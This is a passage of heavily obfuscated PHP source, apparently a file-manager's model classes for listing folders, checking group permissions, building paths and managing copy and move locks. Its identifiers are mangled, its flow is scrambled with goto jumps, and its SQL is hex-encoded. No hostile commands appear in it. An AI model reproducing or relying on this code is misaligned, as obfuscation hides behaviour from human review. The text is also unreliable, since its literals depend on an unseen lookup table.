(!defined($cã…Ô”ìÓÓ[427])) { return; } $FËèˆ–ã‚≈ = Model($cã…Ô”ìÓÓ[428])->listData(); goto D™˘’≈œâç; dπﬂÃØïçÓ: } protected function _listAppendChildren(&$CÂçÔä´âÜ, $E—‚±ôºµ–) { goto Aú∆Ò†‡ëä; Aú∆Ò†‡ëä: $eÖ‚ÁÓ¡Œ¶ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Eô˘çß’îª = $eÖ‚ÁÓ¡Œ¶[361]; $DÇˆ–ÿ§Îî = array(); goto aæåÜè∞–˜; aæåÜè∞–˜: $e»é†’öó¿ = 1024 * 50; $CÂçÔä´âÜ = is_array($CÂçÔä´âÜ) ? $CÂçÔä´âÜ : array(); $CÔø—´öë£ = count($CÂçÔä´âÜ); goto aÖÒ©÷Öï›; aÖÒ©÷Öï›: $A°ºîö†ÈË = $this->tablePrefix . $this->tableName; for ($FÑ∆ƒóç…û = 0; $FÑ∆ƒóç…û < $CÔø—´öë£; $FÑ∆ƒóç…û++) { $d—á≠⁄à◊ = intval($CÂçÔä´âÜ[$FÑ∆ƒóç…û][$eÖ‚ÁÓ¡Œ¶[397]]); if ($CÂçÔä´âÜ[$FÑ∆ƒóç…û][$eÖ‚ÁÓ¡Œ¶[370]]) { $B≤ì◊˘Ÿ«Ô = $CÂçÔä´âÜ[$FÑ∆ƒóç…û][$eÖ‚ÁÓ¡Œ¶[369]]; $Eô˘çß’îª .= "\x53\105\114\105\x43\x54\x20\x2a\40\106\122\x4f\115\40\x28\x53\x45\x4c\105\x43\124\x20\47{$B≤ì◊˘Ÿ«Ô}\x5f\x68\141\163\106\151\154\145\47\40\141\x73\40\150\x61\x73\54\x63\x6f\x75\x6e\164\50\x31\51\x20\x61\163\x20\x68\141\163\x43\157\165\156\x74\40\x46\x52\x4f\115\40\140{$A°ºîö†ÈË}\x60\40\12\11\11\x9\x9\x9\x77\150\145\162\145\40\x70\x61\162\145\156\164\111\x44\x3d{$B≤ì◊˘Ÿ«Ô}\40\141\x6e\x64\x20\x69\163\106\x6f\x6c\x64\x65\x72\75\60\x20\x61\x6e\144\x20\x69\163\x44\x65\154\145\164\x65\75{$d—á≠⁄à◊}\x29\x20\141\x73\40\164\x62\x31\x5f{$B≤ì◊˘Ÿ«Ô}\40\x75\x6e\151\157\x6e\x20\x61\x6c\x6c\40\12\x9\11\x9\x9\11\x53\105\x4c\x45\103\x54\x20\x2a\x20\x46\x52\117\x4d\40\50\x53\105\114\105\x43\x54\x20\47{$B≤ì◊˘Ÿ«Ô}\137\150\x61\x73\106\x6f\x6c\144\145\x72\x27\x20\x61\163\x20\150\x61\163\106\x69\x6c\x65\x2c\143\157\x75\156\x74\50\x31\51\40\x61\x73\40\x68\141\163\103\x6f\x75\156\164\40\x46\x52\117\115\40\140{$A°ºîö†ÈË}\x60\x20\12\11\x9\x9\x9\11\167\150\x65\162\x65\40\x70\141\162\x65\156\164\x49\104\75{$B≤ì◊˘Ÿ«Ô}\40\141\156\144\40\x69\163\x46\x6f\x6c\x64\145\x72\x3d\x31\40\x61\x6e\144\x20\x69\x73\x44\x65\x6c\x65\164\x65\75{$d—á≠⁄à◊}\x29\40\x61\x73\x20\x74\142\x32\x5f{$B≤ì◊˘Ÿ«Ô}\40\165\156\151\x6f\x6e\40\x61\x6c\154\x20"; } if ((strlen($Eô˘çß’îª) >= $e»é†’öó¿ || $FÑ∆ƒóç…û == $CÔø—´öë£ - 1) && $Eô˘çß’îª) { $Eô˘çß’îª = substr($Eô˘çß’îª, 0, -strlen($eÖ‚ÁÓ¡Œ¶[449])); $CÜÃ™…·ﬂ∂ = $this->query($Eô˘çß’îª); $DÇˆ–ÿ§Îî = array_merge($DÇˆ–ÿ§Îî, $CÜÃ™…·ﬂ∂); $Eô˘çß’îª = $eÖ‚ÁÓ¡Œ¶[33]; } } $DÇˆ–ÿ§Îî = array_to_keyvalue($DÇˆ–ÿ§Îî, $eÖ‚ÁÓ¡Œ¶[450]); goto dç¡ì◊®≤ø; dç¡ì◊®≤ø: foreach ($CÂçÔä´âÜ as &$DÇë¡¬Ï©±) { if ($DÇë¡¬Ï©±[$eÖ‚ÁÓ¡Œ¶[370]]) { unset($DÇë¡¬Ï©±[$eÖ‚ÁÓ¡Œ¶[372]]); $DÇë¡¬Ï©±[$eÖ‚ÁÓ¡Œ¶[192]] = intval($DÇˆ–ÿ§Îî[$DÇë¡¬Ï©±[$eÖ‚ÁÓ¡Œ¶[369]] . $eÖ‚ÁÓ¡Œ¶[451]][$eÖ‚ÁÓ¡Œ¶[452]]); $DÇë¡¬Ï©±[$eÖ‚ÁÓ¡Œ¶[191]] = intval($DÇˆ–ÿ§Îî[$DÇë¡¬Ï©±[$eÖ‚ÁÓ¡Œ¶[369]] . $eÖ‚ÁÓ¡Œ¶[453]][$eÖ‚ÁÓ¡Œ¶[452]]); } } goto cÚŸˆå…∞ä; cÚŸˆå…∞ä: } protected function _listAppendAuth(&$DÏàˆãƒÚé) { goto BËë–Ùﬂ¿∑; aÿ⁄¶√Ÿò´: $fàπ¯ø¿›¢ = Model($D—´˜≠ç‰è[454])->getSourceList($Bæ≠ŸÇ‚äí, $cÚ»≥≥Øë∞); foreach ($DÏàˆãƒÚé as $E¶√ñÖ Íë => &$dÑ©≠°≈ô—) { $dÑ©≠°≈ô—[$D—´˜≠ç‰è[376]] = $fàπ¯ø¿›¢[$dÑ©≠°≈ô—[$D—´˜≠ç‰è[369]]]; if (!$dÑ©≠°≈ô—[$D—´˜≠ç‰è[376]] && $dÑ©≠°≈ô—[$D—´˜≠ç‰è[371]] == self::TYPE_GROUP) { $dÑ©≠°≈ô—[$D—´˜≠ç‰è[376]] = Action($D—´˜≠ç‰è[455])->pathGroupAuthMake($dÑ©≠°≈ô—[$D—´˜≠ç‰è[456]]); if (!$dÑ©≠°≈ô—[$D—´˜≠ç‰è[376]] && !_get($GLOBALS, $D—´˜≠ç‰è[457])) { $dÑ©≠°≈ô—[$D—´˜≠ç‰è[189]] = !1; $dÑ©≠°≈ô—[$D—´˜≠ç‰è[188]] = !1; } } if ($dÑ©≠°≈ô—[$D—´˜≠ç‰è[376]]) { $dÑ©≠°≈ô—[$D—´˜≠ç‰è[189]] = AuthModel::authCheckEdit($dÑ©≠°≈ô—[$D—´˜≠ç‰è[376]][$D—´˜≠ç‰è[377]]); $dÑ©≠°≈ô—[$D—´˜≠ç‰è[188]] = AuthModel::authCheckView($dÑ©≠°≈ô—[$D—´˜≠ç‰è[376]][$D—´˜≠ç‰è[377]]); } $this->groupPathDisplay($dÑ©≠°≈ô—); } goto c•´ÓΩ≥…ñ; bâÜ“ä®⁄: foreach ($DÏàˆãƒÚé as $dÑ©≠°≈ô—) { if ($dÑ©≠°≈ô—[$D—´˜≠ç‰è[371]] == self::TYPE_GROUP) { $Bæ≠ŸÇ‚äí[] = $dÑ©≠°≈ô—[$D—´˜≠ç‰è[369]]; } } if (!$Bæ≠ŸÇ‚äí) { return; } $cÚ»≥≥Øë∞ = array_to_keyvalue($DÏàˆãƒÚé, $D—´˜≠ç‰è[369]); goto aÿ⁄¶√Ÿò´; BËë–Ùﬂ¿∑: $D—´˜≠ç‰è =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!defined($D—´˜≠ç‰è[427])) { return; } $Bæ≠ŸÇ‚äí = array(); goto bâÜ“ä®⁄; c•´ÓΩ≥…ñ: } public function groupPathDisplay(&$BÊ¶ŒçÁâ”) { goto Aó⁄êﬂÜöø; a¨¬ìå§’ç: $A’‘ë⁄πè÷ = $this->parentLevelArray($fÈ›≤‚¥“è[$a›√òøäØ´[459]]); $CÛΩé‰òÏƒ = $a›√òøäØ´[33]; foreach ($A’‘ë⁄πè÷ as $d„≈Ó£æ´Ÿ) { $FÚò› ˆà¨ = Model($a›√òøäØ´[458])->getInfo($d„≈Ó£æ´Ÿ); $CÛΩé‰òÏƒ .= $FÚò› ˆà¨[$a›√òøäØ´[391]][$a›√òøäØ´[369]] . $a›√òøäØ´[47]; } goto EÆ◊ıÓÒû´; EÆ◊ıÓÒû´: $BÊ¶ŒçÁâ”[$a›√òøäØ´[460]] = $fÈ›≤‚¥“è[$a›√òøäØ´[461]]; $BÊ¶ŒçÁâ”[$a›√òøäØ´[380]] = $fÈ›≤‚¥“è[$a›√òøäØ´[459]]; $BÊ¶ŒçÁâ”[$a›√òøäØ´[462]] = $fÈ›≤‚¥“è[$a›√òøäØ´[463]]; goto d€èˆΩ’“∂; Aó⁄êﬂÜöø: $a›√òøäØ´ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($BÊ¶ŒçÁâ”[$a›√òøäØ´[371]] != self::TYPE_GROUP) { return; } $fÈ›≤‚¥“è = Model($a›√òøäØ´[458])->getInfo($BÊ¶ŒçÁâ”[$a›√òøäØ´[456]]); goto a¨¬ìå§’ç; d€èˆΩ’“∂: $BÊ¶ŒçÁâ”[$a›√òøäØ´[464]] = $CÛΩé‰òÏƒ . $fÈ›≤‚¥“è[$a›√òøäØ´[391]][$a›√òøäØ´[369]]; goto aÜÉ√ü∂Ù¡; aÜÉ√ü∂Ù¡: } protected function _listAppendPath(&$eüß€§çëç) { goto e∏•‡ô¯⁄±; Dô©∂ õÁ˜: $b≈â“∫·øÊ = array(); foreach ($e„éöÃÇåí as $a–Ïõˆ˘º¥ => $DÇ‘Ú∏ƒë≥) { if (!$DÇ‘Ú∏ƒë≥) { $b≈â“∫·øÊ[] = $a–Ïõˆ˘º¥; } } if ($b≈â“∫·øÊ) { $D±Ê—ç∑Û‹ = array($FÖÎ∞É£—è[383] => array($FÖÎ∞É£—è[384], $b≈â“∫·øÊ)); if (count($b≈â“∫·øÊ) == 1) { $bß—°¬á˘  = $this->sourceInfo($b≈â“∫·øÊ[0]); $bß—°¬á˘  = is_array($bß—°¬á˘ ) ? array($bß—°¬á˘ ) : !1; } else { $bß—°¬á˘  = $this->field($FÖÎ∞É£—è[465])->where($D±Ê—ç∑Û‹)->select(); } $eŸ‹œ≤Ê¯Î = array_to_keyvalue($bß—°¬á˘ , $FÖÎ∞É£—è[369], $FÖÎ∞É£—è[28]); $e„éöÃÇåí = array_merge_index($e„éöÃÇåí, $eŸ‹œ≤Ê¯Î); } goto d·˘©‚ø∑œ; d·˘©‚ø∑œ: $dâ¬è“¡∂– = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($eüß€§çëç as &$DƒîÀÆ∏€®) { goto dåƒò—ıÙ‡; CìÜìóè´©: $FÏîº‘ãù’ = trim($DƒîÀÆ∏€®[$FÖÎ∞É£—è[466]], $FÖÎ∞É£—è[8]); if ($DƒîÀÆ∏€®[$FÖÎ∞É£—è[461]] == $FÖÎ∞É£—è[468] && $FÏîº‘ãù’) { $DƒîÀÆ∏€®[$FÖÎ∞É£—è[28]] = $FÏîº‘ãù’; } $this->_listAppendPathRecycle($DƒîÀÆ∏€®, $c·—∂”∆óÆ, $dâ¬è“¡∂–); goto Eâäù£¡®ı; dåƒò—ıÙ‡: $c·—∂”∆óÆ = $this->parentLevelArray($DƒîÀÆ∏€®[$FÖÎ∞É£—è[459]]); $FõÒÂËÖù¥ = $this->_listAppendPathRoot($DƒîÀÆ∏€®, $c·—∂”∆óÆ); foreach ($c·—∂”∆óÆ as $B∞ñ∆ıÖ∑) { if (isset($e„éöÃÇåí[$B∞ñ∆ıÖ∑])) { $FõÒÂËÖù¥ .= $e„éöÃÇåí[$B∞ñ∆ıÖ∑] . $FÖÎ∞É£—è[8]; } } goto Fô¯ü…Œªõ; Fô¯ü…Œªõ: if ($c·—∂”∆óÆ) { $FõÒÂËÖù¥ .= $DƒîÀÆ∏€®[$FÖÎ∞É£—è[28]]; } if ($DƒîÀÆ∏€®[$FÖÎ∞É£—è[370]]) { $FõÒÂËÖù¥ .= $FÖÎ∞É£—è[8]; } $DƒîÀÆ∏€®[$FÖÎ∞É£—è[466]] = str_replace($FÖÎ∞É£—è[467], $FÖÎ∞É£—è[8], $FõÒÂËÖù¥); goto CìÜìóè´©; Eâäù£¡®ı: } goto a®›π¬õ”Æ; e∏•‡ô¯⁄±: $FÖÎ∞É£—è =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e„éöÃÇåí = array(); foreach ($eüß€§çëç as &$DƒîÀÆ∏€®) { $e„éöÃÇåí[$DƒîÀÆ∏€®[$FÖÎ∞É£—è[369]]] = $DƒîÀÆ∏€®[$FÖÎ∞É£—è[28]]; $c·—∂”∆óÆ = $this->parentLevelArray($DƒîÀÆ∏€®[$FÖÎ∞É£—è[459]]); array_shift($c·—∂”∆óÆ); foreach ($c·—∂”∆óÆ as $B∞ñ∆ıÖ∑) { if (!isset($e„éöÃÇåí[$B∞ñ∆ıÖ∑])) { $e„éöÃÇåí[$B∞ñ∆ıÖ∑] = 0; } } } goto Dô©∂ õÁ˜; a®›π¬õ”Æ: } private function _listAppendPathRecycle(&$D∞±Ùüíœù, $aâÒìÇµùö, $B–œÉùﬂä) { goto cØ‡ÿÊãáó; cØ‡ÿÊãáó: $b©Îπ›ò à =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (intval($D∞±Ùüíœù[$b©Îπ›ò à[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($B–œÉùﬂä, $aâÒìÇµùö) && $D∞±Ùüíœù[$b©Îπ›ò à[369]] != $B–œÉùﬂä) { return; } goto C ∞∆åäõÛ; C ∞∆åäõÛ: $cùïé∫åÎë = explode($b©Îπ›ò à[8], trim($D∞±Ùüíœù[$b©Îπ›ò à[466]], $b©Îπ›ò à[8])); $EÇ˘é®îêç = implode($b©Îπ›ò à[8], array_slice($cùïé∫åÎë, 2)); $D∞±Ùüíœù[$b©Îπ›ò à[466]] = $b©Îπ›ò à[8] . LNG($b©Îπ›ò à[469]) . $b©Îπ›ò à[8] . ltrim($EÇ˘é®îêç, $b©Îπ›ò à[8]); goto fäµ‰ë‚íú; fäµ‰ë‚íú: $D∞±Ùüíœù[$b©Îπ›ò à[459]] = $b©Îπ›ò à[470] . implode($b©Îπ›ò à[47], array_slice($aâÒìÇµùö, 1)) . $b©Îπ›ò à[47]; if ($D∞±Ùüíœù[$b©Îπ›ò à[369]] == $B–œÉùﬂä) { $D∞±Ùüíœù[$b©Îπ›ò à[459]] = $b©Îπ›ò à[470]; $D∞±Ùüíœù[$b©Îπ›ò à[461]] = $b©Îπ›ò à[468]; $D∞±Ùüíœù[$b©Îπ›ò à[28]] = LNG($b©Îπ›ò à[469]); } $D∞±Ùüíœù[$b©Îπ›ò à[471]] = $b©Îπ›ò à[472]; goto B£Ÿ§”Öï≤; B£Ÿ§”Öï≤: } protected function _listAppendPathRoot(&$dº§À€£Ω, $BÇÊÜÌøÖ™) { $bÖ‡Æ√Ñçá =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C‚€™ˆßåı = $bÖ‡Æ√Ñçá[33]; if ($dº§À€£Ω[$bÖ‡Æ√Ñçá[371]] == self::TYPE_USER) { if (defined($bÖ‡Æ√Ñçá[427]) && $dº§À€£Ω[$bÖ‡Æ√Ñçá[456]] == USER_ID) { $C‚€™ˆßåı = LNG($bÖ‡Æ√Ñçá[473]); if (!$BÇÊÜÌøÖ™) { $dº§À€£Ω[$bÖ‡Æ√Ñçá[28]] = $C‚€™ˆßåı; } } else { $F˜†¥µ°—â = Model($bÖ‡Æ√Ñçá[474])->getInfoSimple($dº§À€£Ω[$bÖ‡Æ√Ñçá[456]]); $C‚€™ˆßåı = LNG($bÖ‡Æ√Ñçá[475]) . $bÖ‡Æ√Ñçá[157] . $F˜†¥µ°—â[$bÖ‡Æ√Ñçá[28]] . $bÖ‡Æ√Ñçá[476]; } } else { if ($dº§À€£Ω[$bÖ‡Æ√Ñçá[371]] == self::TYPE_GROUP) { $F˜†¥µ°—â = Model($bÖ‡Æ√Ñçá[458])->getInfoSimple($dº§À€£Ω[$bÖ‡Æ√Ñçá[456]]); $C‚€™ˆßåı = $F˜†¥µ°—â[$bÖ‡Æ√Ñçá[28]]; } else { if ($dº§À€£Ω[$bÖ‡Æ√Ñçá[371]] == self::TYPE_SYSTEM) { $F˜†¥µ°—â = $this->sourceInfo($BÇÊÜÌøÖ™[0], !0); $C‚€™ˆßåı = $F˜†¥µ°—â[$bÖ‡Æ√Ñçá[28]]; } } } $C‚€™ˆßåı = $C‚€™ˆßåı ? $bÖ‡Æ√Ñçá[8] . $C‚€™ˆßåı . $bÖ‡Æ√Ñçá[8] : $bÖ‡Æ√Ñçá[8]; return $C‚€™ˆßåı; } protected function _listAppendUser(&$BÏ∫ı¶·Œƒ) { $Aá∑É©‚π” =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÕó±£“àŸ = array_to_keyvalue($BÏ∫ı¶·Œƒ, $Aá∑É©‚π”[33], $Aá∑É©‚π”[378]); $a˘∞Úçâ¿Ê = array_to_keyvalue($BÏ∫ı¶·Œƒ, $Aá∑É©‚π”[33], $Aá∑É©‚π”[379]); $FÕÚˆ„§âÁ = array_merge($dÕó±£“àŸ, $a˘∞Úçâ¿Ê); $döà‘Ò∑Ç = Model($Aá∑É©‚π”[477])->userListInfo($FÕÚˆ„§âÁ); foreach ($BÏ∫ı¶·Œƒ as &$cãÂÇÕ›ú´) { $C®éœº∑∫˜ = $cãÂÇÕ›ú´[$Aá∑É©‚π”[378]]; $cãÂÇÕ›ú´[$Aá∑É©‚π”[378]] = $döà‘Ò∑Ç[$C®éœº∑∫˜] ? $döà‘Ò∑Ç[$C®éœº∑∫˜] : !1; $C®éœº∑∫˜ = $cãÂÇÕ›ú´[$Aá∑É©‚π”[379]]; $cãÂÇÕ›ú´[$Aá∑É©‚π”[379]] = $döà‘Ò∑Ç[$C®éœº∑∫˜] ? $döà‘Ò∑Ç[$C®éœº∑∫˜] : !1; if (isset($cãÂÇÕ›ú´[$Aá∑É©‚π”[417]]) && $cãÂÇÕ›ú´[$Aá∑É©‚π”[417]][$Aá∑É©‚π”[478]]) { $E–í·ä“¯Í = $GLOBALS[$Aá∑É©‚π”[6]][$Aá∑É©‚π”[84]][$Aá∑É©‚π”[479]]; if ($cãÂÇÕ›ú´[$Aá∑É©‚π”[417]][$Aá∑É©‚π”[480]] <= time() - $E–í·ä“¯Í) { $this->metaSet($cãÂÇÕ›ú´[$Aá∑É©‚π”[369]], $Aá∑É©‚π”[478], null); $this->metaSet($cãÂÇÕ›ú´[$Aá∑É©‚π”[369]], $Aá∑É©‚π”[480], null); unset($cãÂÇÕ›ú´[$Aá∑É©‚π”[417]][$Aá∑É©‚π”[478]]); continue; } $a†±ÃÛÚÇÁ = $cãÂÇÕ›ú´[$Aá∑É©‚π”[417]][$Aá∑É©‚π”[478]]; $cãÂÇÕ›ú´[$Aá∑É©‚π”[417]][$Aá∑É©‚π”[481]] = Model($Aá∑É©‚π”[477])->getInfoSimpleOuter($a†±ÃÛÚÇÁ); } } } public function parentLevelArray($E◊‹ö∑éñÇ) { $aÒ‹ôñåñª =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E◊‹ö∑éñÇ = explode($aÒ‹ôñåñª[47], trim($E◊‹ö∑éñÇ, $aÒ‹ôñåñª[47])); return array_remove_value($E◊‹ö∑éñÇ, $aÒ‹ôñåñª[468]); } public function listAll($d¢ÚËïñÖÔ) { goto eÜêØºƒ¶à; fÃ·Â—Æ‹¥: $aÉßæπÖ£¡ = $f…Ñ‚ê¿ªø[486]; $A åÍ™íØÛ = "\114\x45\x46\124\x20\x4a\117\111\x4e\40{$this->tablePrefix}\151\x6f\137\x66\x69\x6c\x65\x20\146\151\154\145\x20\157\x6e\40\x73\x6f\165\162\143\x65\56\146\151\x6c\x65\x49\104\x20\x3d\40\146\151\154\x65\56\146\x69\154\145\111\x44"; $A¨áƒö≈ø¿ = $this->alias($f…Ñ‚ê¿ªø[487])->field($aÉßæπÖ£¡)->where($AÑñΩèæﬁ•)->join($A åÍ™íØÛ)->select(); goto eÛú◊≤ÍˆÌ; aÕç¯ËåÏ†: $d‰ÉΩ©Ÿ·Á = array(); foreach ($A¨áƒö≈ø¿ as $aÆ´Â°ìò„ => $eê¿îªà≥) { goto Aùë¡ƒè‘œ; cøáÇ¨∫ÊÑ: $Dªœê™Èﬂ« = str_replace($f…Ñ‚ê¿ªø[467], $f…Ñ‚ê¿ªø[8], $Dªœê™Èﬂ«); $Dªœê™Èﬂ« = str_replace($f…Ñ‚ê¿ªø[467], $f…Ñ‚ê¿ªø[8], $Dªœê™Èﬂ«); $fƒ≠◊à’Ùë = array($f…Ñ‚ê¿ªø[387] => str_replace($f…Ñ‚ê¿ªø[467], $f…Ñ‚ê¿ªø[8], $Dªœê™Èﬂ«), $f…Ñ‚ê¿ªø[488] => intval($eê¿îªà≥[$f…Ñ‚ê¿ªø[370]]), $f…Ñ‚ê¿ªø[391] => $this->pathInfoFilter($eê¿îªà≥, !0)); goto eÜÊã≤àÜË; Aùë¡ƒè‘œ: $cÑﬁÈÉêº = $this->parentLevelArray($eê¿îªà≥[$f…Ñ‚ê¿ªø[459]]); array_shift($cÑﬁÈÉêº); $Dªœê™Èﬂ« = $fÚÒÖÉåÖ; goto c‹˘⁄§òœ∏; eÜÊã≤àÜË: if (!$eê¿îªà≥[$f…Ñ‚ê¿ªø[370]]) { $fƒ≠◊à’Ùë[$f…Ñ‚ê¿ªø[419]] = $eê¿îªà≥[$f…Ñ‚ê¿ªø[419]]; $fƒ≠◊à’Ùë[$f…Ñ‚ê¿ªø[489]] = $eê¿îªà≥[$f…Ñ‚ê¿ªø[75]]; } $d‰ÉΩ©Ÿ·Á[] = $fƒ≠◊à’Ùë; goto báí°·‘™´; c‹˘⁄§òœ∏: for ($FèàÒı•ÔÉ = 0; $FèàÒı•ÔÉ < count($cÑﬁÈÉêº); $FèàÒı•ÔÉ++) { $Dªœê™Èﬂ« .= $A¨áƒö≈ø¿[$cÑﬁÈÉêº[$FèàÒı•ÔÉ]][$f…Ñ‚ê¿ªø[28]] . $f…Ñ‚ê¿ªø[8]; } $Dªœê™Èﬂ« .= $eê¿îªà≥[$f…Ñ‚ê¿ªø[28]]; if ($eê¿îªà≥[$f…Ñ‚ê¿ªø[370]]) { $Dªœê™Èﬂ« .= $f…Ñ‚ê¿ªø[8]; } goto cøáÇ¨∫ÊÑ; báí°·‘™´: } return $d‰ÉΩ©Ÿ·Á; goto a£Î≤†—è¬; eÜêØºƒ¶à: $f…Ñ‚ê¿ªø =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CÔÉµ´ÆºÃ = $this->sourceInfo($d¢ÚËïñÖÔ); $AÑñΩèæﬁ• = array($f…Ñ‚ê¿ªø[482] => array($f…Ñ‚ê¿ªø[483], $CÔÉµ´ÆºÃ[$f…Ñ‚ê¿ªø[459]] . $d¢ÚËïñÖÔ . $f…Ñ‚ê¿ªø[484]), $f…Ñ‚ê¿ªø[485] => 0); goto fÃ·Â—Æ‹¥; eÛú◊≤ÍˆÌ: $this->_listAppendAuth($A¨áƒö≈ø¿); $this->_listAppendUser($A¨áƒö≈ø¿); $this->_listAppendPath($A¨áƒö≈ø¿); goto AÚò‹√Û¶ò; AÚò‹√Û¶ò: $A¨áƒö≈ø¿ = array_to_keyvalue($A¨áƒö≈ø¿, $f…Ñ‚ê¿ªø[369]); $fÚÒÖÉåÖ = "\x2f{$CÔÉµ´ÆºÃ[$f…Ñ‚ê¿ªø[28]]}\57"; $fÚÒÖÉåÖ = $fÚÒÖÉåÖ == $f…Ñ‚ê¿ªø[467] ? $f…Ñ‚ê¿ªø[8] : $fÚÒÖÉåÖ; goto aÕç¯ËåÏ†; a£Î≤†—è¬: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($B›„ÓëÏ‘ı) { goto eéË€ñêúÏ; Fµ‡åü∞à”: $this->_lockEvent($B›„ÓëÏ‘ı, array($aÒ≥¢∞πØı[493], $aÒ≥¢∞πØı[494]), $A˘ê¡ºŒ·í); $this->_lockCheckEnd($aÒ≥¢∞πØı[490], $B›„ÓëÏ‘ı); goto f√Œ€ü–‡Ø; eéË€ñêúÏ: $aÒ≥¢∞πØı =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->allowLock()) { return; } $this->_lockCheck($aÒ≥¢∞πØı[490], $B›„ÓëÏ‘ı); goto a¶ûÁ˘§∫ı; a¶ûÁ˘§∫ı: $A˘ê¡ºŒ·í = 1; $this->_lockEvent($B›„ÓëÏ‘ı, array($aÒ≥¢∞πØı[491], $aÒ≥¢∞πØı[492]), $A˘ê¡ºŒ·í); $this->_lockParent($B›„ÓëÏ‘ı, array($aÒ≥¢∞πØı[492]), $A˘ê¡ºŒ·í); goto Fµ‡åü∞à”; f√Œ€ü–‡Ø: } public function lockCopyEnd($c¨ôÀúíåÍ) { $f•ÃÊ˘ì„Ü =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->allowLock()) { return; } $EÆãœÕ„ﬁ¯ = 0; $this->_lockEvent($c¨ôÀúíåÍ, array($f•ÃÊ˘ì„Ü[491], $f•ÃÊ˘ì„Ü[492]), $EÆãœÕ„ﬁ¯); $this->_lockParent($c¨ôÀúíåÍ, array($f•ÃÊ˘ì„Ü[492]), $EÆãœÕ„ﬁ¯); $this->_lockEvent($c¨ôÀúíåÍ, array($f•ÃÊ˘ì„Ü[493], $f•ÃÊ˘ì„Ü[494]), $EÆãœÕ„ﬁ¯); } public function lockWriteStart($Dà€à¶úóê, $a›óö¿Ñ»ü = '') { goto dŸ—Ã“°âï; dÑÂˆÍ€ÙŸ: $e™•±ŸãÒπ = 1; $this->_lockKey($Dç˜∑—¥†ï[495] . $Dà€à¶úóê . $Dç˜∑—¥†ï[91] . $a›óö¿Ñ»ü, $e™•±ŸãÒπ); $this->_lockEvent($Dà€à¶úóê, array($Dç˜∑—¥†ï[490], $Dç˜∑—¥†ï[492]), $e™•±ŸãÒπ); goto f≥«ãÃªêá; dŸ—Ã“°âï: $Dç˜∑—¥†ï =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->allowLock()) { return; } $this->_lockCheck($Dç˜∑—¥†ï[491], $Dà€à¶úóê); goto dÑÂˆÍ€ÙŸ; f≥«ãÃªêá: $this->_lockParent($Dà€à¶úóê, array($Dç˜∑—¥†ï[490], $Dç˜∑—¥†ï[492]), $e™•±ŸãÒπ); $this->_lockCheckEnd($Dç˜∑—¥†ï[491], $Dà€à¶úóê); goto cﬂ°ƒÓÜüû; cﬂ°ƒÓÜüû: } public function lockWriteEnd($fÑ¬Ê°—· , $CÀ◊ô¡æ¿ë = '') { $A§ÈÕººé¶ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->allowLock()) { return; } $fÜÚ¨ƒÈ¢Í = 0; $this->_lockKey($A§ÈÕººé¶[495] . $fÑ¬Ê°—·  . $A§ÈÕººé¶[91] . $CÀ◊ô¡æ¿ë, $fÜÚ¨ƒÈ¢Í); $this->_lockEvent($fÑ¬Ê°—· , array($A§ÈÕººé¶[490], $A§ÈÕººé¶[492]), $fÜÚ¨ƒÈ¢Í); $this->_lockParent($fÑ¬Ê°—· , array($A§ÈÕººé¶[490], $A§ÈÕººé¶[492]), $fÜÚ¨ƒÈ¢Í); } public function lockMoveStart($d™ ÓÜï⁄ø) { goto D≠°‘·õ¥◊; B≤ó›ÿÁÜè: $this->_lockParent($d™ ÓÜï⁄ø, array($eÁíäñ¨Ç∆[490], $eÁíäñ¨Ç∆[492]), $B•◊£ÑÜ»¥); $this->_lockEvent($d™ ÓÜï⁄ø, array($eÁíäñ¨Ç∆[497], $eÁíäñ¨Ç∆[493], $eÁíäñ¨Ç∆[494]), $B•◊£ÑÜ»¥); $this->_lockCheckEnd($eÁíäñ¨Ç∆[492], $d™ ÓÜï⁄ø); goto aŒÜ¬ÑÖ˘¶; D‰âÿäéñ‰: $B•◊£ÑÜ»¥ = 1; $this->_lockKey($eÁíäñ¨Ç∆[496] . $d™ ÓÜï⁄ø, $B•◊£ÑÜ»¥); $this->_lockEvent($d™ ÓÜï⁄ø, array($eÁíäñ¨Ç∆[490], $eÁíäñ¨Ç∆[491]), $B•◊£ÑÜ»¥); goto B≤ó›ÿÁÜè; D≠°‘·õ¥◊: $eÁíäñ¨Ç∆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->allowLock()) { return; } $this->_lockCheck($eÁíäñ¨Ç∆[492], $d™ ÓÜï⁄ø); goto D‰âÿäéñ‰; aŒÜ¬ÑÖ˘¶: } public function lockMoveEnd($e˘ÙÁﬁÍáÂ) { goto CΩ¯„≥”‡È; DÁ„ï”â¯ : $this->_lockEvent($e˘ÙÁﬁÍáÂ, array($C≥¶ôïóÖÓ[497], $C≥¶ôïóÖÓ[493], $C≥¶ôïóÖÓ[494]), $f˜ã⁄âõ∏‰); goto DÑÔÓÈ£Öﬁ; d≈Ë∆…Íºñ: $this->_lockKey($C≥¶ôïóÖÓ[496] . $e˘ÙÁﬁÍáÂ, $f˜ã⁄âõ∏‰); $this->_lockEvent($e˘ÙÁﬁÍáÂ, array($C≥¶ôïóÖÓ[490], $C≥¶ôïóÖÓ[491]), $f˜ã⁄âõ∏‰); $this->_lockParent($e˘ÙÁﬁÍáÂ, array($C≥¶ôïóÖÓ[490], $C≥¶ôïóÖÓ[492]), $f˜ã⁄âõ∏‰); goto DÁ„ï”â¯ ; CΩ¯„≥”‡È: $C≥¶ôïóÖÓ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->allowLock()) { return; } $f˜ã⁄âõ∏‰ = 0; goto d≈Ë∆…Íºñ; DÑÔÓÈ£Öﬁ: } private function 